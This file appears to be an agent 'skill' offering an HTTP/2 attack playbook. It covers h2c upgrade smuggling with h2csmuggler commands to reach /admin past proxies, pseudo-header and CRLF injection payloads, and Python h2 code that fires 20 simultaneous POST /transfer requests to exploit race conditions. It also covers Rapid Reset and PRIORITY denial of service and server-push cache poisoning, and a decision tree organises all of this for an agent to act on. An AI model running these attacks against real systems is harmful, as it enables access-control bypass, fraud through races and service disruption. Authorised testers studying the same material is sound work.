---
name: http2-specific-attacks
description: >-
  HTTP/2 protocol-specific attack playbook. Use when the target supports HTTP/2 and you need to exploit binary framing, HPACK compression, h2c upgrade smuggling, pseudo-header injection, stream multiplexing abuse, or H2→H1 downgrade translation flaws.
---

# SKILL: HTTP/2 Specific Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: HTTP/2 protocol-level attack techniques beyond basic request smuggling. Covers h2c smuggling, pseudo-header manipulation, HPACK attacks, single-packet race conditions, and H2→H1 downgrade injection. Base models conflate HTTP/2 smuggling with HTTP/1.1 smuggling — this skill focuses on H2-unique attack surface.

## 0. RELATED ROUTING

- [request-smuggling](../request-smuggling/SKILL.md) — CL.TE/TE.CL/TE.TE fundamentals and H2.CL/H2.TE variants
- [request-smuggling/H2_SMUGGLING_VARIANTS.md](../request-smuggling/H2_SMUGGLING_VARIANTS.md) — byte-level H2.CL/H2.TE payloads, CL.0, client-side desync
- [race-condition](../race-condition/SKILL.md) — single-packet attack leverages H2 multiplexing for race conditions
- [web-cache-deception](../web-cache-deception/SKILL.md) — cache poisoning via H2 smuggled responses

---

## 1. HTTP/2 ATTACK SURFACE OVERVIEW

| Feature | Attack Surface |
|---|---|
| Binary framing | Frame-level manipulation, parser differentials |
| HPACK compression | Compression oracles (CRIME/BREACH), table poisoning |
| Multiplexing | Single-packet race conditions, RST_STREAM flood |
| Server push | Cache poisoning via unsolicited push |
| Pseudo-headers (`:method`/`:path`/`:authority`/`:scheme`) | Injection, request splitting, path discrepancy |

---

## 2. h2c (HTTP/2 CLEARTEXT) SMUGGLING

### 2.1 Concept

h2c is HTTP/2 without TLS, negotiated via the HTTP/1.1 `Upgrade` mechanism. Many reverse proxies forward the `Upgrade: h2c` header without understanding it, allowing attackers to bypass proxy-level access controls.

```
Client ──[Upgrade: h2c]──> Reverse Proxy ──[forwards blindly]──> Backend
                                                                    │
                                                            Backend speaks H2
                                                            Proxy is blind to
                                                            the H2 conversation
```

### 2.2 Attack Flow

```
1. Client sends HTTP/1.1 request with:
   GET / HTTP/1.1
   Host: target.com
   Upgrade: h2c
   HTTP2-Settings: <base64 H2 settings>
   Connection: Upgrade, HTTP2-Settings

2. Proxy forwards request (doesn't understand h2c)
3. Backend responds: HTTP/1.1 101 Switching Protocols
4. Connection is now HTTP/2 between client and backend
5. Proxy is now a TCP tunnel — cannot inspect/filter H2 frames
6. Client sends H2 requests directly to backend, bypassing proxy rules
```

### 2.3 What You Can Bypass

```
✓ Path-based access controls (/admin blocked at proxy → accessible via h2c)
✓ WAF rules (proxy-side WAF can't inspect H2 binary frames)
✓ Rate limiting (proxy-level rate limits bypassed)
✓ Authentication (proxy-enforced auth headers)
✓ IP restrictions (proxy validates source IP, but h2c tunnel bypasses)
```

### 2.4 Tool: h2csmuggler

```bash
# Install
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
pip3 install h2

# Basic smuggle — access /admin bypassing proxy restrictions
python3 h2csmuggler.py -x https://target.com/ --test

# Smuggle specific path
python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin/users

# With custom headers
python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin \
    -H "Authorization: Bearer token123"
```

### 2.5 Detection

```bash
# Check if backend supports h2c upgrade
curl -v --http1.1 https://target.com/ \
    -H "Upgrade: h2c" \
    -H "HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA" \
    -H "Connection: Upgrade, HTTP2-Settings"

# 101 Switching Protocols → h2c supported
# 200/400/other → h2c not supported or proxy blocks upgrade
```

---

## 3. PSEUDO-HEADER INJECTION

### 3.1 HTTP/2 Pseudo-Headers

HTTP/2 replaces the request line with pseudo-headers (prefixed with `:`):

| Pseudo-Header | HTTP/1.1 Equivalent | Example |
|---|---|---|
| `:method` | Request method | `GET`, `POST` |
| `:path` | Request URI | `/api/users` |
| `:authority` | Host header | `target.com` |
| `:scheme` | Protocol | `https` |

### 3.2 Path Discrepancy Between Proxy and Backend

```
Scenario: Proxy routes based on :path, backend uses different parsing

H2 request:
  :method: GET
  :path: /public/../admin/users
  :authority: target.com

Proxy sees: /public/../admin/users → matches /public/* rule → ALLOWED
Backend normalizes: /admin/users → serves admin content
```

### 3.3 Duplicate Pseudo-Header Injection

HTTP/2 spec forbids duplicate pseudo-headers, but implementation varies:

```
:method: GET
:path: /public
:path: /admin       ← duplicate, forbidden by spec
:authority: target.com

Proxy may use first :path (/public) for routing
Backend may use last :path (/admin) for serving
```

### 3.4 Authority vs Host Disagreement

```
:authority: public.target.com    ← proxy routes based on this
host: admin.internal.target.com  ← backend may prefer Host header

Result: proxy routes to public vhost, backend serves admin vhost
```

### 3.5 Scheme Manipulation

```
:scheme: https
:path: /api/internal
:authority: target.com

If backend trusts :scheme to determine if request is "internal":
  :scheme: https → "external" → restricted
  :scheme: http  → "internal" → unrestricted access
```

---

## 4. HPACK COMPRESSION ATTACKS

### 4.1 CRIME/BREACH on HTTP/2

```
Principle: HPACK compresses headers. If attacker controls part of a header and a secret
exists in the same compression context, matching guesses → smaller frames → oracle.

Limitation: HPACK uses static+dynamic table (not raw DEFLATE), per-connection table,
requires many requests on same connection. Harder than original CRIME.
```

### 4.2 Header Table Poisoning

```
HPACK dynamic table stores recent headers across requests on same connection.
1. Attacker sends X-Custom: malicious-value → added to dynamic table
2. Subsequent requests may reference this entry
3. If CDN/proxy pools connections → attacker and victim share table → cross-request leakage
```

---

## 5. STREAM MULTIPLEXING ABUSE

### 5.1 Single-Packet Attack (Race Conditions)

HTTP/2 multiplexing allows sending multiple requests in a single TCP packet, achieving true simultaneous server-side processing:

```
Traditional race condition: send N requests → network jitter → inconsistent timing
H2 single-packet: pack N requests into one TCP segment → all arrive simultaneously

                    ┌─ Stream 1: POST /transfer (amount=1000)
Single TCP packet ──├─ Stream 3: POST /transfer (amount=1000)
                    ├─ Stream 5: POST /transfer (amount=1000)
                    └─ Stream 7: POST /transfer (amount=1000)
                    
All 4 requests processed at the same nanosecond window
```

```python
# Using h2 library — prepare all requests, send in single write
import h2.connection, h2.config, socket, ssl

ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
sock = ctx.wrap_socket(socket.create_connection((host, 443)), server_hostname=host)

conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
conn.initiate_connection()
sock.sendall(conn.data_to_send())

for i in range(20):
    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, [(':method','POST'),(':path',path),(':authority',host),(':scheme','https')])
    conn.send_data(sid, b'amount=1000', end_stream=True)

sock.sendall(conn.data_to_send())  # ALL frames in single TCP packet
```

### 5.2 RST_STREAM Flood (CVE-2023-44487 "Rapid Reset")

```
Attack: HEADERS (open stream) → RST_STREAM (cancel) → repeat thousands/sec
Server processes each open/close but client doesn't wait for responses
Amplification: minimal client resources → massive server CPU exhaustion
```

### 5.3 PRIORITY Manipulation

```
Set exclusive=true + weight=256 on attacker's stream → starve other users' requests
```

---

## 6. HTTP/2 → HTTP/1.1 DOWNGRADE ISSUES

### 6.1 Header Injection via Binary Format

H2 header values are binary — `\r\n` is valid data within a value. When proxy downgrades to H1, `\r\n` in header value becomes actual line break → header injection.

```
H2: X-Custom: "value\r\nInjected: evil"  → binary, valid
H1: X-Custom: value                      → line break
    Injected: evil                        → new header!
```

### 6.2 Transfer-Encoding Smuggling

H2 spec forbids `transfer-encoding`, but some proxies pass it through during downgrade → backend processes chunked encoding → H2.TE smuggling. See `../request-smuggling/H2_SMUGGLING_VARIANTS.md`.

### 6.3 Content-Length Discrepancy

H2 uses frame length (no CL needed). If proxy generates CL during downgrade but attacker also sent a CL header → conflicting lengths → request smuggling.

### 6.4 Header Name Case

H2 requires lowercase. Sending `Transfer-Encoding` (uppercase) is invalid H2 but some proxies pass it → valid H1 header on backend.

---

## 7. SERVER PUSH CACHE POISONING

```
Attack: trigger server push for /static/app.js with attacker-controlled content
  → PUSH_PROMISE frame pushes malicious response
  → browser/CDN caches poisoned content under legitimate URL
  → all subsequent loads serve attacker's content

Mitigation: most modern browsers/CDNs restrict or disable server push
```

---

## 8. DECISION TREE

```
Target supports HTTP/2?
│
├── YES
│   ├── Does proxy support h2c upgrade?
│   │   ├── YES → h2c smuggling (Section 2)
│   │   │   └── Access restricted paths bypassing proxy rules
│   │   └── NO → Continue
│   │
│   ├── H2→H1 downgrade between proxy and backend?
│   │   ├── YES → Header injection via binary format (Section 6.1)
│   │   │   ├── TE header passthrough? → H2.TE smuggling (Section 6.2)
│   │   │   ├── CL discrepancy? → H2.CL smuggling (Section 6.3)
│   │   │   └── See ../request-smuggling/H2_SMUGGLING_VARIANTS.md
│   │   └── NO (end-to-end H2) → Continue
│   │
│   ├── Need race condition?
│   │   ├── YES → Single-packet attack via multiplexing (Section 5.1)
│   │   │   └── Pack N requests in one TCP segment
│   │   └── NO → Continue
│   │
│   ├── Pseudo-header manipulation viable?
│   │   ├── :path discrepancy → path confusion (Section 3.2)
│   │   ├── :authority vs Host → vhost confusion (Section 3.4)
│   │   └── :scheme manipulation → access control bypass (Section 3.5)
│   │
│   ├── Server push enabled?
│   │   ├── YES → Cache poisoning via push (Section 7)
│   │   └── NO → Continue
│   │
│   └── DoS objective?
│       ├── RST_STREAM rapid reset (Section 5.2)
│       └── PRIORITY starvation (Section 5.3)
│
└── NO (HTTP/1.1 only)
    └── See ../request-smuggling/SKILL.md for H1-specific techniques
```

---

## 9. TOOLS REFERENCE

| Tool | Purpose |
|---|---|
| **h2csmuggler** | h2c upgrade smuggling (github.com/BishopFox/h2csmuggler) |
| **http2smugl** | H2-specific desync testing (github.com/neex/http2smugl) |
| **h2 (Python)** | HTTP/2 protocol lib for frame crafting (github.com/python-hyper/h2) |
| **nghttp2** | H2 client/server tools (nghttp2.org) |
| **Burp HTTP Request Smuggler** | Automated variant scanning |
| **curl --http2** | Quick H2 probing (built-in) |

---

## 10. QUICK REFERENCE

```bash
# h2c probe
curl -v --http1.1 https://target.com/ -H "Upgrade: h2c" -H "Connection: Upgrade, HTTP2-Settings" -H "HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA"

# H2 support check
curl -v --http2 https://target.com/ 2>&1 | grep "ALPN"
```
